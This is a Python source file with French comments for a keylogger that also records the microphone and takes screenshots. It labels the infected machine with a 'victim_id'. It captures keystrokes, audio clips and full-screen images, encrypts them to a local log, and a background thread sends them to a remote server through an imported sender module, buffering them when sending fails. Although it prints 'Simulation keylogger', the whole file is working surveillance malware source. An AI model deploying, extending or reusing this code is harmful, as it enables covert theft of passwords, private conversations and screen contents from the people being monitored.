import uuid
import json
import time
import threading
import base64
from pathlib import Path
from io import BytesIO

# Nouveaux imports pour l'audio
# Vous devez installer PyAudio : pip install PyAudio
import pyaudio
import wave

# Nouveaux imports pour la capture d'écran
import mss # Pour prendre des captures d'écran
from PIL import Image # Pour la manipulation d'images (si nécessaire)

from pynput import keyboard
from cryptography.fernet import Fernet
# --- MISE À JOUR : Import des configurations depuis config.py ---
# On importe toutes les variables nécessaires du fichier config
from sender import send_events
from config import (
    SEND_INTERVAL, 
    AUDIO_RECORD_SECONDS, 
    AUDIO_RATE, 
    SCREENSHOT_INTERVAL, 
    # Pour l'instant on garde les autres variables hors de ce fichier si non utilisées
)
# -------------------------------------------------------------

victim_id = str(uuid.uuid4())

encrypted_file = Path("logs/encrypted_log.jsonl")
buffer_file = Path("logs/buffer.jsonl")

encrypted_file.parent.mkdir(exist_ok=True)
encrypted_file.touch(exist_ok=True)
buffer_file.touch(exist_ok=True)

key = Fernet.generate_key()
cipher = Fernet(key)

events = [] # Liste globale pour les événements (clavier + audio + screenshot)

# ----------------- CONFIGURATION AUDIO (Utilise config.py) -----------------
# Définir les paramètres d'enregistrement audio
CHUNK = 1024 # Nombre de frames par buffer
FORMAT = pyaudio.paInt16 # 16 bits
CHANNELS = 1 # Mono
# UTILISE LES CONSTANTES IMPORTÉES
RATE = AUDIO_RATE # Taux d'échantillonnage (Hz)
RECORD_SECONDS = AUDIO_RECORD_SECONDS # Durée de chaque enregistrement audio
# ---------------------------------------------------------------------------

# ----------------- CONFIGURATION SCREENSHOT (Utilise config.py) -----------------
# UTILISE LA CONSTANTE IMPORTÉE
# SCREENSHOT_INTERVAL est maintenant défini dans config.py
# --------------------------------------------------------------------------------

def encrypt_event(event):
    """Chiffre un événement JSON."""
    return cipher.encrypt(json.dumps(event).encode()).decode()

def save_local_encrypted(event):
    """Sauvegarde un événement chiffré dans le fichier de log local."""
    with open(encrypted_file, "a") as f:
        f.write(encrypt_event(event) + "\n")

def save_buffer(events_to_save):
    """Sauvegarde une liste d'événements dans le buffer en cas d'échec d'envoi."""
    with open(buffer_file, "a") as f:
        for e in events_to_save:
            f.write(json.dumps(e) + "\n")

def read_buffer():
    """Lit et vide le buffer d'événements."""
    if buffer_file.stat().st_size == 0:
        return []
    with open(buffer_file, "r") as f:
        lines = f.readlines()
    buffer_file.write_text("") # Vider le buffer après lecture
    return [json.loads(l) for l in lines]

# ----------------- CAPTURE CLAVIER -----------------
def on_press(key):
    """Gère l'événement de pression de touche."""
    ts = time.time()
    try:
        k = key.char
    except AttributeError:
        k = str(key)

    event = {"timestamp": ts, "type": "keyboard", "key": k}
    events.append(event)
    save_local_encrypted(event)

def on_release(key):
    """Gère l'événement de relâchement de touche."""
    if key == keyboard.Key.esc:
        print("Arrêt manuel")
        # Ne retourne pas False pour que le thread de clavier s'arrête
        return False

# ----------------- CAPTURE AUDIO -----------------
def audio_capture_routine():
    """Routine pour capturer l'audio en continu."""
    # On utilise les variables globales/importées RECORD_SECONDS et RATE
    global RATE, RECORD_SECONDS 
    
    try:
        p = pyaudio.PyAudio()

        # Ouvrir un flux audio (stream)
        stream = p.open(format=FORMAT,
                            channels=CHANNELS,
                            rate=RATE,
                            input=True,
                            frames_per_buffer=CHUNK)

        print("[Audio] Démarrage de la capture audio...")

        while True:
            # Enregistrer pour la durée définie (RECORD_SECONDS)
            frames = []
            for _ in range(0, int(RATE / CHUNK * RECORD_SECONDS)):
                data = stream.read(CHUNK)
                frames.append(data)

            # Convertir les frames audio en données brutes
            audio_data = b''.join(frames)
            
            # Encoder les données brutes en base64 pour un stockage JSON sûr
            encoded_audio = base64.b64encode(audio_data).decode('utf-8')
            
            ts = time.time()
            audio_event = {
                "timestamp": ts,
                "type": "audio",
                "duration": RECORD_SECONDS,
                "rate": RATE,
                "channels": CHANNELS,
                "format": "pcm16_base64",
                "data": encoded_audio
            }
            
            # Ajouter à la liste globale des événements
            events.append(audio_event)
            save_local_encrypted(audio_event)
            print(f"[Audio] Événement audio de {RECORD_SECONDS}s capturé et chiffré.")

    except ImportError:
        print("[ERREUR] PyAudio n'est pas installé. La capture audio est désactivée.")
    except Exception as e:
        print(f"[ERREUR] Erreur lors de la capture audio: {e}")
    finally:
        # Fermeture propre en cas d'erreur ou d'arrêt
        if 'stream' in locals() and stream.is_active():
            stream.stop_stream()
            stream.close()
        if 'p' in locals():
            p.terminate()

# ----------------- CAPTURE SCREENSHOT -----------------
def screenshot_capture_routine():
    """Routine pour capturer des captures d'écran en continu."""
    # On utilise la variable globale/importée SCREENSHOT_INTERVAL
    global SCREENSHOT_INTERVAL

    print("[Screenshot] Démarrage de la capture d'écran...")
    
    try:
        with mss.mss() as sct:
            while True:
                # Capturer l'écran principal (moniteur 0)
                monitor = sct.monitors[0]
                sct_img = sct.grab(monitor)
                
                # Convertir l'image capturée en un format binaire (PNG)
                img_buffer = BytesIO()
                
                # Utiliser Pillow pour enregistrer l'image brute de mss dans le buffer
                img = Image.frombytes("RGB", sct_img.size, sct_img.rgb, "raw", "BGR")
                img.save(img_buffer, format="PNG")
                
                # Encoder les données binaires en base64 pour l'envoi JSON
                encoded_image = base64.b64encode(img_buffer.getvalue()).decode('utf-8')
                
                ts = time.time()
                screenshot_event = {
                    "timestamp": ts,
                    "type": "screenshot",
                    "format": "png_base64",
                    # WARNING: Ces données sont très volumineuses !
                    "data": encoded_image
                }
                
                # Ajouter à la liste globale des événements
                global events
                events.append(screenshot_event)
                save_local_encrypted(screenshot_event)
                print(f"[Screenshot] Capture d'écran capturée et chiffrée. Taille: {len(encoded_image) // 1024} KB")

                # Attendre l'intervalle avant la prochaine capture (utilise la valeur de config.py)
                time.sleep(SCREENSHOT_INTERVAL)
                
    except ImportError:
        print("[ERREUR] mss ou Pillow ne sont pas installés. La capture d'écran est désactivée.")
    except Exception as e:
        print(f"[ERREUR] Erreur lors de la capture d'écran: {e}")


# ----------------- ROUTINE D'ENVOI -----------------
def send_routine():
    """Routine pour envoyer les événements au serveur."""
    # On utilise la variable globale/importée SEND_INTERVAL
    global SEND_INTERVAL
    
    while True:
        # Utilise la valeur de config.py
        time.sleep(SEND_INTERVAL)

        global events
        # Vérifier si on a des événements ou si le buffer est vide
        if not events and buffer_file.stat().st_size == 0:
            continue

        # combiner buffer + events
        buffered = read_buffer()
        to_send = buffered + events
        events.clear()

        print(f"[Sender] Envoi de {len(to_send)} événements...")
        success = send_events(victim_id, to_send)
        
        if not success:
            print("[Sender] Échec de l'envoi, sauvegarde dans le buffer.")
            save_buffer(to_send)
        else:
            print("[Sender] Envoi réussi.")


# ----------------- MAIN -----------------
if __name__ == "__main__":
    print(f"Simulation keylogger active (UUID={victim_id})")

    # 1. Démarrer le thread d'envoi
    t_sender = threading.Thread(target=send_routine, daemon=True)
    t_sender.start()
    
    # 2. Démarrer le thread de capture audio
    t_audio = threading.Thread(target=audio_capture_routine, daemon=True)
    t_audio.start()

    # 3. Démarrer le thread de capture d'écran
    t_screenshot = threading.Thread(target=screenshot_capture_routine, daemon=True)
    t_screenshot.start()

    # 4. Démarrer le listener clavier
    listener = keyboard.Listener(on_press=on_press, on_release=on_release)
    listener.start()
    
    # Attendre que le listener clavier se termine (nécessaire pour maintenir le script en vie)
    listener.join()
    
    # Si le listener s'arrête (via ESC), on s'assure que les autres threads s'arrêtent aussi
    # Comme les autres sont des daemons, ils s'arrêteront avec le thread principal.
    print("Programme terminé.")